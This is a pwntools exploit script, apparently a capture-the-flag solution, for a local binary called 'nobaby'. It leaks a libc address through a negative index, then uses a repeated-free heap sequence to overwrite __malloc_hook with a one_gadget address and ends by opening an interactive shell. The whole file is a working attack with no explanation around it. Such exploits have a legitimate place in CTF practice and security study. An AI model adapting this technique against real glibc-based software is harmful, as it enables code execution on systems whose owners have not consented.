from pwn import *

def add(content):
	r.sendline('1')
	r.recvuntil('Content: ')
	r.sendline(content)
	r.recvuntil("Your choice: ")
	
def show(idx):
	r.sendline('2')
	r.recvuntil("Index: ")
	r.sendline(str(idx))
	r.recvuntil("Content: ")
	msg = (r.recv(6)+"\x00\x00")
	r.recvuntil("Your choice: ")
	return u64(msg)
	
def delete(idx):
	r.sendline('3')
	r.recvuntil('Index: ')
	r.sendline(str(idx))
	r.recvuntil("Your choice: ")
	
def name(name):
	r.recvuntil("Name: ")
	r.sendline(name)
	r.recvuntil("Your choice: ")

r = process("nobaby")
puts_got = 0x601F98
offset_puts = 0x6f690
offset_system = 0x45390
offset_sh = 0x18cd57
offset__malloc_hook = 0x3c4b10
raw_input("?")
name('\x00'*0x80)
puts = show(-262994)
libc = puts - offset_puts
system = libc + offset_system
sh = libc + offset_sh
one_gadget = libc + 0x4526a     
__malloc_hook = libc + offset__malloc_hook
log.info("puts: %#x",puts)
log.info("libc: %#x",libc)
log.info("__malloc_hook: %#x",__malloc_hook)
log.info("one_gadget: %#x",one_gadget)
for i in range(10):
	add('A'*0x10)
for i in range(10):
	delete(-1)
add('A'*0x10)
for i in range(0x68):
	delete(-1)
for i in range(7):
	delete(i)
delete(9)
delete(8)
delete(10)
add(p64(__malloc_hook-0x23))
add(p64(__malloc_hook))
add(p64(__malloc_hook))
add('\x00'*0x13+p64(one_gadget))
r.sendline('1')
r.interactive()